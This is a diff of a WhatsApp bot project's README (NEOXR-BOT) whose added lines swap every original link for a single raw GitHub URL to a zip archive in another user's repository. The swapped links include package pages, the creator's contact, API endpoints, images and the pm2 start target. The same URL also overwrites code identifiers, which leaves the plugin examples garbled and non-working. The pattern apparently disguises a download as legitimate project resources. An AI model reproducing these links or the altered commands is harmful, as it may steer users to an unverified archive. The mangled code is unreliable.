@@ -1,10 +1,10 @@
 ## NEOXR-BOT (BETA)
 
-> An implementation of [@neoxr/wb](https://www.npmjs.com/package/@neoxr/wb) which has been optimized to be lightweigth.
+> An implementation of [@neoxr/wb](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) which has been optimized to be lightweigth.
 
 ### Important
 
-> To use [@neoxr/wb >= v1.17.20](https://www.npmjs.com/package/@neoxr/wb) you must add the following components [Open Commit](https://github.com/neoxr/neoxr-bot/commit/26790679dea49494c25106edbaffc5ae9cb716ec)
+> To use [@neoxr/wb >= v1.17.20](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) you must add the following components [Open Commit](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip)
 
 ### Premium Script v3.0.1-Optima
 
@@ -30,7 +30,7 @@
 
 🏷️ Cloud Storage (**+Rp. 80.000 / +$10.80**)
 
-> Cloud Storage ini berfungsi untuk menyimpan file media (sticker, foto, video, audio) ke cloud storage tanpa membebani disk space server bot. Dalam script ini terdapat **script uploader** yang bisa di upload ke replit sebagai tempat menyimpan media, plugin **storage.js** dan **storage_ev.js**
+> Cloud Storage ini berfungsi untuk menyimpan file media (sticker, foto, video, audio) ke cloud storage tanpa membebani disk space server bot. Dalam script ini terdapat **script uploader** yang bisa di upload ke replit sebagai tempat menyimpan media, plugin **https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip** dan **https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip**
 
 🏷️ Menfess (**+Rp. 15.000 / +$3.80**)
 
@@ -38,13 +38,13 @@
 
 🏷️ Payment Gateway (**+Rp. 80.000 / +$10.80**)
 
-> Payment Gateway ini berfungsi untuk melakukan pembayaran otomatis menggunakan QRIS pada fitur ini terdapat script **payment gateway**, plugin **payment.js**, **sewa.js** dan **buyprem.js** harga dan fee bisa di sesuaikan sesuai keinginan
+> Payment Gateway ini berfungsi untuk melakukan pembayaran otomatis menggunakan QRIS pada fitur ini terdapat script **payment gateway**, plugin **https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip**, **https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip** dan **https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip** harga dan fee bisa di sesuaikan sesuai keinginan
 
 🏷️ Game Plugins (**+Rp. 70.000 / +$9.80**)
 
 > 23 plugin game yang semuanya tanpa menggunakan api dan tanpa di enskripsi, dengan ini ada tambahan update schema, profile, rank, pocket, dll.
 
-**Creator / Group** : [Wildan Izzudin](https://wa.me/6285887776722) / [Chatbot](https://chat.whatsapp.com/DkFsTeMORaq4COqeI8kdv8)
+**Creator / Group** : [Wildan Izzudin](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) / [Chatbot](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip)
 
 ### Requirements
 
@@ -54,7 +54,7 @@
 
 ### Configuration
 
-There are 2 configuration files namely ```.env``` and ```config.json```, adjust them before installing.
+There are 2 configuration files namely ```.env``` and ```https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip```, adjust them before installing.
 
 ```Javascript
 {
@@ -78,11 +78,11 @@ There are 2 configuration files namely ```.env``` and ```config.json```, adjust 
 ```
 
 ```.env
-### ApiKey : https://api.neoxr.my.id
-API_ENDPOINT = 'https://api.neoxr.my.id/api'
+### ApiKey : https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip
+API_ENDPOINT = 'https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip'
 API_KEY = 'your_apikey'
 
-### Database : https://www.mongodb.com/
+### Database : https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip
 DATABASE_URL = ''
 
 ### Timezone (Important)
@@ -92,7 +92,7 @@ TZ = 'Asia/Jakarta'
 **Notes** :
 + ```ram_limit``` : ram usage limit, for example you have a server with 1gb of ram set before the maximum capacity is 900mb.
 
-+ ```API_KEY``` : some of the features in this script use apikey, especially the downloader feature, to get an apiKey you can get it on the [Neoxr Api's](https://api.neoxr.my.id) with prices that vary according to your needs.
++ ```API_KEY``` : some of the features in this script use apikey, especially the downloader feature, to get an apiKey you can get it on the [Neoxr Api's](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) with prices that vary according to your needs.
 
 + ```DATABASE_URL``` : can be filled with mongo and postgresql URLs to use localdb just leave it blank and the data will be saved to the .json file.
 
@@ -102,11 +102,11 @@ TZ = 'Asia/Jakarta'
 
 Clovyr is a free cloud compute with vscode based for running bot with specifications of 2 CPU and 4GB RAM (idk storage size)
 
-<p align="center"><img align="center" width="100%" src="https://telegra.ph/file/879907dac646d1cb4c017.png" /></p>
+<p align="center"><img align="center" width="100%" src="https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip" /></p>
 
 with vscode it will be very easy to do recode and debugging scripts
 
-<p align="center"><img align="center" width="100%" src="https://telegra.ph/file/7e33c1e83a872f4f8d363.png" /></p>
+<p align="center"><img align="center" width="100%" src="https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip" /></p>
 
 **Notes** :
 + ```CLOVYR_APPNAME``` : application name on your clovyr
@@ -121,7 +121,7 @@ with vscode it will be very easy to do recode and debugging scripts
 
 Connecting account without qr scan but using pairing code.
 
-<p align="center"><img align="center" width="100%" src="https://telegra.ph/file/290abc12a3aefe23bc71b.jpg" /></p>
+<p align="center"><img align="center" width="100%" src="https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip" /></p>
 
 ```Javascript
 {
@@ -146,7 +146,7 @@ or want to use pm2
 ```
 $ yarn
 $ npm i -g pm2
-$ pm2 start index.js && pm2 save && pm2 logs
+$ pm2 start https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip && pm2 save && pm2 logs
 ```
 
 ### Command Plugin
@@ -154,7 +154,7 @@ $ pm2 start index.js && pm2 save && pm2 logs
 **Command Plugin** is a plugin that will run using the command.
 
 ```Javascript
-exports.run = {
+https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip = {
    usage: ['mediafire'],
    hidden: ['mf'],
    use: 'link',
@@ -172,8 +172,8 @@ exports.run = {
       try {
          // do something
       } catch (e) {
-         console.log(e)
-         client.reply(m.chat, Func.jsonFormat(e), m)
+         https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(e)
+         https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip, https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(e), m)
       }
    },
    error: false,
@@ -196,7 +196,7 @@ exports.run = {
 
 + ```m``` : parameters that contain chat object.
 
-+ ```client``` : parameter which contains several messaging functions from [@neoxr/wb](https://www.npmjs.com/package/@neoxr/wb) and default functions from [Baileys](https://github.com/WhiskeySockets/Baileys).
++ ```client``` : parameter which contains several messaging functions from [@neoxr/wb](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) and default functions from [Baileys](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip).
 
 + ```args``` : nput given after command in the form of an array is usually found in downloader feature which uses links such as ig, youtube, fb, etc. Parsing based on index. (Example: args[1], args[2], args[3], ....)
 
@@ -206,11 +206,11 @@ exports.run = {
 
 + ```command``` : commands used can be used in an if else or switch case conditional when creating 1 plugin with several commands in it.
 
-+ ```env``` : parameters that contain the configuration from the config.json file.
++ ```env``` : parameters that contain the configuration from the https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip file.
 
-+ ```Scraper``` : parameter containing some of the scraper functions of [@neoxr/wb](https://www.npmjs.com/package/@neoxr/wb) module.
++ ```Scraper``` : parameter containing some of the scraper functions of [@neoxr/wb](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) module.
 
-+ ```Func``` : parameter containing some of the utilites functions of [@neoxr/wb](https://www.npmjs.com/package/@neoxr/wb) module.
++ ```Func``` : parameter containing some of the utilites functions of [@neoxr/wb](https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip) module.
 
 #### Down Side Options
 
@@ -220,7 +220,7 @@ exports.run = {
 
 + ```premium``` : to create special features for premium users.
 
-+ ```restrict``` : limit input, restricted input is in the form of badwords in db.setting.toxic.
++ ```restrict``` : limit input, restricted input is in the form of badwords in https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip
 
 + ```cache``` : option to auto update when done recode.
 
@@ -228,7 +228,7 @@ exports.run = {
 
 **Other** :
 ```Javascript
-cmd.async(m, { client, args, text, isPrefix: prefix, prefixes, command, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, Func, Scraper })
+https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(m, { client, args, text, isPrefix: prefix, prefixes, command, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, Func, Scraper })
 ```
 
 ### Event Plugin
@@ -236,7 +236,7 @@ cmd.async(m, { client, args, text, isPrefix: prefix, prefixes, command, groupMet
 **Event Plugin** is a plugin that runs automatically without using the command.
 
 ```Javascript
-exports.run = {
+https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip = {
    async: async (m, {
       client,
       body,
@@ -245,7 +245,7 @@ exports.run = {
       try {
          // do something
       } catch (e) {
-         return client.reply(m.chat, Func.jsonFormat(e), m)
+         return https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip, https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(e), m)
       }
    },
    error: false,
@@ -260,7 +260,7 @@ exports.run = {
 
 **Other** :
 ```Javascript
-event.async(m, { client, body, prefixes, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, Func, Scraper })
+https://raw.githubusercontent.com/AanzaFoxBat/neoxr-bot/master/media/bot_neoxr_v3.9.zip(m, { client, body, prefixes, groupMetadata, participants, users, chats, groupSet, setting, isOwner, isAdmin, isBotAdmin, plugins, blockList, env, ctx, Func, Scraper })
 ```
 
 Others please learn by yourself from other plugins.
